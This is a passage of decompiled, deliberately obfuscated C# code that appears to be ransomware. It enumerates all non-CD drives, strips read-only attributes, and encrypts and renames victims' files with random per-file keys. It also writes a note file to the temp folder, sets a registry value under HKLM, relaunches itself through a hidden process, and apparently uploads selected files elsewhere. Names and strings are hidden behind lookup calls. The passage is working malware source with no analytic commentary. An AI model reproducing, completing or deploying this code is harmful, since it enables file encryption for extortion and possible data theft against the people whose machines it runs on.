			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void WuUUchilOZc()
	{
		string string_ = ITFOBjLBjn(getString_0(107391121));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(KPabEeiJZVewrU(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(KPabEeiJZVewrU(getString_0(107391584)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	public static void KNIARyPOBX()
	{
		fMeAFAnEJct(getString_0(107396784), KPabEeiJZVewrU(getString_0(107391551)));
		string text = KPabEeiJZVewrU(getString_0(107391357));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107390780) + text + getString_0(107390780) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396784);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void zWOwTEpvFVcem(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
		}
		catch (Exception ex)
		{
			if (IyKNhTqRuk)
			{
				try
				{
					File.AppendAllText(AJkkstCArH, getString_0(107390743) + string_0 + getString_0(107390734) + ex.Message + getString_0(107396245));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string NvfCSlJqoNa()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107392858);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107390645);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107390668))) ? getString_0(107390650) : getString_0(107390691));
				break;
			case 0:
				text = getString_0(107390673);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107390640);
				break;
			case 4:
				text = getString_0(107390659);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107390609) : getString_0(107390618));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107390585) : getString_0(107390622)) : getString_0(107390627)) : getString_0(107390604));
				break;
			case 10:
				text = getString_0(107390580);
				break;
			}
		}
		if (text != getString_0(107392858))
		{
			text = getString_0(107390575) + text;
			if (oSVersion.ServicePack != getString_0(107392858))
			{
				text = text + getString_0(107390594) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string zpdJPJGqPYGV(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107395375);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(KPabEeiJZVewrU(getString_0(107395342)));
				streamWriter.WriteLine(getString_0(107396245));
				streamWriter.WriteLine(KPabEeiJZVewrU(getString_0(107393324)));
				streamWriter.WriteLine(string_0);
				if (yemgLyczOOW)
				{
					streamWriter.WriteLine(getString_0(107396245));
					streamWriter.WriteLine(KPabEeiJZVewrU(getString_0(107393246)));
					streamWriter.WriteLine(pkkGXNrkowS.NOJMgYxKOBYDCh());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !lPNPDgvBRE)
				{
					File.AppendAllText(text, getString_0(107393213) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (IyKNhTqRuk)
			{
				try
				{
					File.AppendAllText(AJkkstCArH, getString_0(107390589) + ex.Message + getString_0(107396245));
					return text;
				}
				catch (Exception)
				{
					return text;
				}
			}
			return text;
		}
	}

	private static void APEsCqwAGhY(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		BEYZTKrfdviwxZ.BojFrVelCC CS_0024_003C_003E8__locals0 = new BEYZTKrfdviwxZ();
		CS_0024_003C_003E8__locals0.vGyfTCQGiQXjw = string_1;
		CS_0024_003C_003E8__locals0.HEeqUjcHYAUs = string_2;
		CS_0024_003C_003E8__locals0.lOtlwlSuLOi = string_3;
		CS_0024_003C_003E8__locals0.tAjZyCLwpakJwKs = string_4;
		baXqehWULBIGBE = Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.lOtlwlSuLOi);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107396574))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (array[i].IsReady && array[i].DriveType != DriveType.CDRom && !SRFEGlkoeiER.Contains(array[i].Name))
					{
						SRFEGlkoeiER.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				if (!SRFEGlkoeiER.Contains(string_0[j]))
				{
					SRFEGlkoeiER.Add(string_0[j]);
				}
			}
		}
		if (SRFEGlkoeiER.Contains(KPabEeiJZVewrU(getString_0(107391044))) && mmEKKRaGkloGcs == getString_0(107396931))
		{
			SRFEGlkoeiER.Remove(KPabEeiJZVewrU(getString_0(107391044)));
		}
		Parallel.ForEach(SRFEGlkoeiER, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new BEYZTKrfdviwxZ.BojFrVelCC();
			CS_0024_003C_003E8__locals0.lanKrwDoiYXSIJD = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.aXbGoXsatjVtvQD = string_0;
			if (wvpBCFJLeJ && !NvfCSlJqoNa().Contains(BEYZTKrfdviwxZ.getString_0(107390618)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						MLWevbAvFShYk(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.aXbGoXsatjVtvQD);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (uJRCtLGzhdwU == BEYZTKrfdviwxZ.getString_0(107396940))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					bLvLMeOXtJfdOedzV(CS_0024_003C_003E8__locals0.aXbGoXsatjVtvQD, CS_0024_003C_003E8__locals0.lanKrwDoiYXSIJD.vGyfTCQGiQXjw, CS_0024_003C_003E8__locals0.lanKrwDoiYXSIJD.tAjZyCLwpakJwKs, CS_0024_003C_003E8__locals0.lanKrwDoiYXSIJD.HEeqUjcHYAUs, CS_0024_003C_003E8__locals0.lanKrwDoiYXSIJD.lOtlwlSuLOi);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				bLvLMeOXtJfdOedzV(CS_0024_003C_003E8__locals0.aXbGoXsatjVtvQD, CS_0024_003C_003E8__locals0.vGyfTCQGiQXjw, CS_0024_003C_003E8__locals0.tAjZyCLwpakJwKs, CS_0024_003C_003E8__locals0.HEeqUjcHYAUs, CS_0024_003C_003E8__locals0.lOtlwlSuLOi);
			}
		});
	}

	public static void bLvLMeOXtJfdOedzV(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107392858));
		List<string> list3 = list2;
		if (eLAKMpocHKWXQA == getString_0(107396936))
		{
			list = nWCAXKctddiO(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = BhOrqkZFsFPOr.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_039f;
					}
				}
				if ((PdbbQHuALFK == getString_0(107396936) && !item.EndsWith(text)) || faYAKmARedHa.Contains(item))
				{
					continue;
				}
				if (peJAFtAqyTg == getString_0(107396931))
				{
					try
					{
						if (AAOVWQPBaJGzX.JKXMmHfBbDap(item))
						{
							AAOVWQPBaJGzX.kBsTntFlGOZl(item);
						}
					}
					catch
					{
					}
				}
				faYAKmARedHa.Add(item);
				if (!eWoKDGBNuJT.Contains(Path.GetDirectoryName(item)))
				{
					eWoKDGBNuJT.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (sxiybUGjmYR == getString_0(107396931) && fileStream.Length > Convert.ToInt32(ddqPQmPoIWuW) * 1024 * 1024 && !list3.Contains(text))
					{
						if (LZOxaUWpmIj == getString_0(107396931))
						{
							foreach (string item2 in izJuaPEIDwBM)
							{
								if (item.ToLower().EndsWith(item2) && IxktWyCSAKdLJt == getString_0(107396931))
								{
									if (Convert.ToInt32(kyMVozVHGsuV) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											pkkGXNrkowS.XVoGcXcserch(getString_0(107393483), getString_0(107393478), getString_0(107393433), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && IxktWyCSAKdLJt == getString_0(107396936))
								{
									try
									{
										pkkGXNrkowS.XVoGcXcserch(getString_0(107393483), getString_0(107393478), getString_0(107393433), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = stgsEAeFeTEw.aSuXlLtwWpA(item, Convert.ToInt32(ddqPQmPoIWuW) * 1024 * 1024);
						byte[] zVTmHFmLlT = stgsEAeFeTEw.lnSkBnMZylaQj(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						stgsEAeFeTEw.HkuHIkbrpjRy(item, zVTmHFmLlT);
						if (string_2 != getString_0(107391003))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107391003))
					{
						TrxZGVhzMIPrad(item, item + string_2, baXqehWULBIGBE);
					}
					else
					{
						TrxZGVhzMIPrad(item, item + getString_0(107390998), baXqehWULBIGBE);
					}
				}
				catch (Exception)
				{
				}
				IL_039f:;
			}
		}
	}

	public static void nQiQBlceKDnd(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		ZrUPQFEbZMm.mCwVmPeEvIdE CS_0024_003C_003E8__locals0 = new ZrUPQFEbZMm();
		CS_0024_003C_003E8__locals0.nuiJQynaikoWe = list_0;
		CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ = string_1;
		CS_0024_003C_003E8__locals0.LZlHAkhSddj = string_2;
		CS_0024_003C_003E8__locals0.zVrwuHAUxLyay = string_3;
		CS_0024_003C_003E8__locals0.jwPdYfuGxOuj = new List<string> { getString_0(107392858) };
		if (PdbbQHuALFK == getString_0(107396936))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				foreach (string item in CS_0024_003C_003E8__locals0.nuiJQynaikoWe)
				{
					if (CS_0024_003C_003E8__locals0.LZlHAkhSddj.Length != 0)
					{
						string[] lZlHAkhSddj2 = CS_0024_003C_003E8__locals0.LZlHAkhSddj;
						int num2 = 0;
						while (num2 < lZlHAkhSddj2.Length)
						{
							string value2 = lZlHAkhSddj2[num2];
							if (!item.EndsWith(value2))
							{
								num2++;
								continue;
							}
							goto IL_072e;
						}
					}
					try
					{
						if (item.EndsWith(CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ))
						{
							goto IL_072e;
						}
					}
					catch (Exception)
					{
						goto IL_072e;
					}
					if (item.EndsWith(string_0) && !faYAKmARedHa.Contains(item))
					{
						if (peJAFtAqyTg == ZrUPQFEbZMm.getString_0(107396948))
						{
							try
							{
								if (AAOVWQPBaJGzX.JKXMmHfBbDap(item))
								{
									AAOVWQPBaJGzX.kBsTntFlGOZl(item);
								}
							}
							catch
							{
							}
						}
						faYAKmARedHa.Add(item);
						if (!eWoKDGBNuJT.Contains(Path.GetDirectoryName(item)))
						{
							eWoKDGBNuJT.Add(Path.GetDirectoryName(item));
						}
						zWOwTEpvFVcem(item);
						try
						{
							try
							{
								if (new FileInfo(item).Length != 0L)
								{
									goto end_IL_00ee;
								}
								goto end_IL_00ee_2;
								end_IL_00ee:;
							}
							catch (Exception ex12)
							{
								if (IyKNhTqRuk)
								{
									try
									{
										File.AppendAllText(AJkkstCArH, ZrUPQFEbZMm.getString_0(107390760) + item + ZrUPQFEbZMm.getString_0(107408449) + ex12.Message + ZrUPQFEbZMm.getString_0(107396262));
									}
									catch (Exception)
									{
									}
								}
								LuhgDZXWifkSE++;
								goto end_IL_00ee_2;
							}
							if (sxiybUGjmYR == ZrUPQFEbZMm.getString_0(107396948) && new FileInfo(item).Length > Convert.ToInt32(ddqPQmPoIWuW) * 1024 * 1024 && !CS_0024_003C_003E8__locals0.jwPdYfuGxOuj.Contains(string_0))
							{
								CS_0024_003C_003E8__locals0 = new ZrUPQFEbZMm.myOmNLpmgvB();
								CS_0024_003C_003E8__locals0.FEColPUvAKhOS = CS_0024_003C_003E8__locals0;
								try
								{
									if (CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ != ZrUPQFEbZMm.getString_0(107391020))
									{
										if (yemgLyczOOW)
										{
											CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ = htotHetAeUsCN + CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ;
										}
										File.Move(item, item + CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ);
									}
								}
								catch (Exception ex14)
								{
									if (IyKNhTqRuk)
									{
										try
										{
											File.AppendAllText(AJkkstCArH, ZrUPQFEbZMm.getString_0(107390760) + item + ZrUPQFEbZMm.getString_0(107408388) + ex14.Message + ZrUPQFEbZMm.getString_0(107396262));
										}
										catch (Exception)
										{
										}
									}
									LuhgDZXWifkSE++;
									goto end_IL_00ee_2;
								}
								CS_0024_003C_003E8__locals0.ngsQJurIby = ZrUPQFEbZMm.getString_0(107392875);
								if (CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ != ZrUPQFEbZMm.getString_0(107391020))
								{
									CS_0024_003C_003E8__locals0.ngsQJurIby = item + CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ;
								}
								else
								{
									CS_0024_003C_003E8__locals0.ngsQJurIby = item;
								}
								if (LZOxaUWpmIj == ZrUPQFEbZMm.getString_0(107396948))
								{
									Thread thread2 = new Thread((ThreadStart)delegate
									{
										foreach (string item2 in izJuaPEIDwBM)
										{
											if (CS_0024_003C_003E8__locals0.ngsQJurIby.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.FEColPUvAKhOS.rASsmHWKxhVCSQ) && IxktWyCSAKdLJt == ZrUPQFEbZMm.myOmNLpmgvB.getString_0(107396951))
											{
												if (Convert.ToInt32(kyMVozVHGsuV) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ngsQJurIby).Length)
												{
													try
													{
														pkkGXNrkowS.XVoGcXcserch(ZrUPQFEbZMm.myOmNLpmgvB.getString_0(107393503), ZrUPQFEbZMm.myOmNLpmgvB.getString_0(107393498), ZrUPQFEbZMm.myOmNLpmgvB.getString_0(107393453), CS_0024_003C_003E8__locals0.ngsQJurIby);
													}
													catch
													{
													}
												}
											}
											else if (CS_0024_003C_003E8__locals0.ngsQJurIby.ToLower().EndsWith(item2) && IxktWyCSAKdLJt == ZrUPQFEbZMm.myOmNLpmgvB.getString_0(107396956))
											{
												try
												{
													pkkGXNrkowS.XVoGcXcserch(ZrUPQFEbZMm.myOmNLpmgvB.getString_0(107393503), ZrUPQFEbZMm.myOmNLpmgvB.getString_0(107393498), ZrUPQFEbZMm.myOmNLpmgvB.getString_0(107393453), CS_0024_003C_003E8__locals0.ngsQJurIby);
												}
												catch
												{
												}
											}
										}
									});
									thread2.Priority = ThreadPriority.Normal;
									thread2.IsBackground = false;
									thread2.Start();
								}
								string text3 = UmVMgndIWubmZ.ifZFQBAUYVXZr(32);
								string s3 = cEUhIAxhKY.KMmlqOtzJnQsiYY(text3);
								byte[] bytes3 = Encoding.ASCII.GetBytes(s3);
								byte[] array2 = null;
								byte[] byte_2 = stgsEAeFeTEw.aSuXlLtwWpA(CS_0024_003C_003E8__locals0.ngsQJurIby, Convert.ToInt32(ddqPQmPoIWuW) * 1024 * 1024);
								stgsEAeFeTEw.HkuHIkbrpjRy(zVTmHFmLlT: (!USeABfWDSTq) ? (lPNPDgvBRE ? stgsEAeFeTEw.lnSkBnMZylaQj(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : stgsEAeFeTEw.lnSkBnMZylaQj(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.zVrwuHAUxLyay), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (lPNPDgvBRE ? JMNtsrAVumpK.xvIWmLmXVwDAe(byte_2, Encoding.ASCII.GetBytes(text3), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : JMNtsrAVumpK.xvIWmLmXVwDAe(byte_2, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.zVrwuHAUxLyay), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), tevOmFuhLjKBF: CS_0024_003C_003E8__locals0.ngsQJurIby, wAHvXFtGoVAD: bytes3);
							}
							else
							{
								if (yemgLyczOOW)
								{
									CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ = htotHetAeUsCN + CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ;
								}
								string text4 = UmVMgndIWubmZ.ifZFQBAUYVXZr(32);
								string s4 = cEUhIAxhKY.KMmlqOtzJnQsiYY(text4);
								byte[] bytes4 = Encoding.ASCII.GetBytes(s4);
								if (CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ != ZrUPQFEbZMm.getString_0(107391020))
								{
									if (!NHbEtBQcjaHtXtG)
									{
										if (!lPNPDgvBRE)
										{
											DZFNNITCWrKC(item, item + CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ, baXqehWULBIGBE);
										}
										else
										{
											DZFNNITCWrKC(item, item + CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ, Encoding.ASCII.GetBytes(text4));
										}
									}
									else
									{
										try
										{
											if (!lPNPDgvBRE)
											{
												XozvpxrYexO(item, item + CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ, baXqehWULBIGBE);
											}
											else
											{
												XozvpxrYexO(item, item + CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ, Encoding.ASCII.GetBytes(text4));
											}
										}
										catch (Exception ex16)
										{
											if (IyKNhTqRuk)
											{
												try
												{
													File.AppendAllText(AJkkstCArH, ZrUPQFEbZMm.getString_0(107390760) + item + ZrUPQFEbZMm.getString_0(107391006) + ex16.Message + ZrUPQFEbZMm.getString_0(107396262));
												}
												catch (Exception)
												{
												}
											}
											LuhgDZXWifkSE++;
											goto end_IL_00ee_2;
										}
									}
								}
								else if (!NHbEtBQcjaHtXtG)
								{
									if (!lPNPDgvBRE)
									{
										DZFNNITCWrKC(item, item + ZrUPQFEbZMm.getString_0(107391015), baXqehWULBIGBE);
									}
									else
									{
										DZFNNITCWrKC(item, item + ZrUPQFEbZMm.getString_0(107391015), Encoding.ASCII.GetBytes(text4));
									}
								}
								else
								{
									try
									{
										if (!lPNPDgvBRE)
										{
											XozvpxrYexO(item, item, baXqehWULBIGBE);
										}
										else
										{
											XozvpxrYexO(item, item, Encoding.ASCII.GetBytes(text4));
										}
									}
									catch (Exception ex18)
									{
										if (IyKNhTqRuk)
										{
											try
											{
												File.AppendAllText(AJkkstCArH, ZrUPQFEbZMm.getString_0(107390760) + item + ZrUPQFEbZMm.getString_0(107391006) + ex18.Message + ZrUPQFEbZMm.getString_0(107396262));
											}
											catch (Exception)
											{
											}
										}
										LuhgDZXWifkSE++;
										goto end_IL_00ee_2;
									}
								}
								if (lPNPDgvBRE)
								{
									if (CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ != ZrUPQFEbZMm.getString_0(107391020))
									{
										lbMOCvnhGJaBCrXH(item + CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ, bytes4);
									}
									else
									{
										lbMOCvnhGJaBCrXH(item, bytes4);
									}
								}
							}
							goto IL_072e;
							end_IL_00ee_2:;
						}
						catch (Exception)
						{
							goto IL_072e;
						}
					}
					continue;
					IL_072e:
					CS_0024_003C_003E8__locals0.nuiJQynaikoWe.Remove(item);
				}
			});
			return;
		}
		Parallel.ForEach(CS_0024_003C_003E8__locals0.nuiJQynaikoWe, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new ZrUPQFEbZMm.mCwVmPeEvIdE();
			CS_0024_003C_003E8__locals0.FEColPUvAKhOS = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB = string_0;
			if (CS_0024_003C_003E8__locals0.LZlHAkhSddj.Length != 0)
			{
				string[] lZlHAkhSddj = CS_0024_003C_003E8__locals0.LZlHAkhSddj;
				int num = 0;
				while (num < lZlHAkhSddj.Length)
				{
					string value = lZlHAkhSddj[num];
					if (!CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB.EndsWith(value))
					{
						num++;
						continue;
					}
					goto IL_07bb;
				}
			}
			try
			{
				if (CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB.EndsWith(CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ))
				{
					goto IL_07bb;
				}
			}
			catch (Exception)
			{
				goto IL_07bb;
			}
			if (!faYAKmARedHa.Contains(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB))
			{
				if (peJAFtAqyTg == ZrUPQFEbZMm.getString_0(107396948))
				{
					try
					{
						if (AAOVWQPBaJGzX.JKXMmHfBbDap(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB))
						{
							AAOVWQPBaJGzX.kBsTntFlGOZl(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB);
						}
					}
					catch
					{
					}
				}
				faYAKmARedHa.Add(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB);
				if (!eWoKDGBNuJT.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB)))
				{
					eWoKDGBNuJT.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB));
				}
				zWOwTEpvFVcem(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB);
				try
				{
					try
					{
						if (new FileInfo(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB).Length != 0L)
						{
							goto end_IL_0117;
						}
						goto end_IL_0117_2;
						end_IL_0117:;
					}
					catch (Exception ex2)
					{
						if (IyKNhTqRuk)
						{
							try
							{
								File.AppendAllText(AJkkstCArH, ZrUPQFEbZMm.getString_0(107390760) + CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + ZrUPQFEbZMm.getString_0(107408449) + ex2.Message + ZrUPQFEbZMm.getString_0(107396262));
							}
							catch (Exception)
							{
							}
						}
						LuhgDZXWifkSE++;
						goto end_IL_0117_2;
					}
					if (sxiybUGjmYR == ZrUPQFEbZMm.getString_0(107396948) && new FileInfo(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB).Length > Convert.ToInt32(ddqPQmPoIWuW) * 1024 * 1024)
					{
						try
						{
							if (CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ != ZrUPQFEbZMm.getString_0(107391020))
							{
								if (yemgLyczOOW)
								{
									CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ = htotHetAeUsCN + CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ;
								}
								File.Move(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ);
							}
						}
						catch (Exception ex4)
						{
							if (IyKNhTqRuk)
							{
								try
								{
									File.AppendAllText(AJkkstCArH, ZrUPQFEbZMm.getString_0(107390760) + CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + ZrUPQFEbZMm.getString_0(107408388) + ex4.Message + ZrUPQFEbZMm.getString_0(107396262));
								}
								catch (Exception)
								{
								}
							}
							LuhgDZXWifkSE++;
							return;
						}
						if (CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ != ZrUPQFEbZMm.getString_0(107391020))
						{
							CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB += CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ;
						}
						if (LZOxaUWpmIj == ZrUPQFEbZMm.getString_0(107396948))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item3 in izJuaPEIDwBM)
								{
									if (CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB.ToLower().EndsWith(item3 + CS_0024_003C_003E8__locals0.FEColPUvAKhOS.rASsmHWKxhVCSQ) && IxktWyCSAKdLJt == ZrUPQFEbZMm.mCwVmPeEvIdE.getString_0(107396954))
									{
										if (Convert.ToInt32(kyMVozVHGsuV) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB).Length)
										{
											try
											{
												pkkGXNrkowS.XVoGcXcserch(ZrUPQFEbZMm.mCwVmPeEvIdE.getString_0(107393506), ZrUPQFEbZMm.mCwVmPeEvIdE.getString_0(107393501), ZrUPQFEbZMm.mCwVmPeEvIdE.getString_0(107393456), CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB.ToLower().EndsWith(item3) && IxktWyCSAKdLJt == ZrUPQFEbZMm.mCwVmPeEvIdE.getString_0(107396959))
									{
										try
										{
											pkkGXNrkowS.XVoGcXcserch(ZrUPQFEbZMm.mCwVmPeEvIdE.getString_0(107393506), ZrUPQFEbZMm.mCwVmPeEvIdE.getString_0(107393501), ZrUPQFEbZMm.mCwVmPeEvIdE.getString_0(107393456), CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB);
										}
										catch
										{
										}
									}
								}
							});
							thread.IsBackground = false;
							thread.Priority = ThreadPriority.Normal;
							thread.Start();
						}
						string text = UmVMgndIWubmZ.ifZFQBAUYVXZr(32);
						string s = cEUhIAxhKY.KMmlqOtzJnQsiYY(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						byte[] array = null;
						byte[] byte_ = stgsEAeFeTEw.aSuXlLtwWpA(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, Convert.ToInt32(ddqPQmPoIWuW) * 1024 * 1024);
						stgsEAeFeTEw.HkuHIkbrpjRy(zVTmHFmLlT: (!USeABfWDSTq) ? (lPNPDgvBRE ? stgsEAeFeTEw.lnSkBnMZylaQj(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : stgsEAeFeTEw.lnSkBnMZylaQj(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.zVrwuHAUxLyay), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (lPNPDgvBRE ? JMNtsrAVumpK.xvIWmLmXVwDAe(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : JMNtsrAVumpK.xvIWmLmXVwDAe(byte_, Encoding.ASCII.GetBytes(CS_0024_003C_003E8__locals0.zVrwuHAUxLyay), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), tevOmFuhLjKBF: CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, wAHvXFtGoVAD: bytes);
					}
					else
					{
						if (yemgLyczOOW)
						{
							CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ = htotHetAeUsCN + CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ;
						}
						string text2 = UmVMgndIWubmZ.ifZFQBAUYVXZr(32);
						string s2 = cEUhIAxhKY.KMmlqOtzJnQsiYY(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ != ZrUPQFEbZMm.getString_0(107391020))
						{
							if (!NHbEtBQcjaHtXtG)
							{
								if (!lPNPDgvBRE)
								{
									DZFNNITCWrKC(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ, baXqehWULBIGBE);
								}
								else
								{
									DZFNNITCWrKC(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!lPNPDgvBRE)
									{
										XozvpxrYexO(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ, baXqehWULBIGBE);
									}
									else
									{
										XozvpxrYexO(CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB, CS_0024_003C_003E8__locals0.JWmPEXtTPXJlooB + CS_0024_003C_003E8__locals0.rASsmHWKxhVCSQ, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (IyKNhTqRuk)
									{
										try
										{
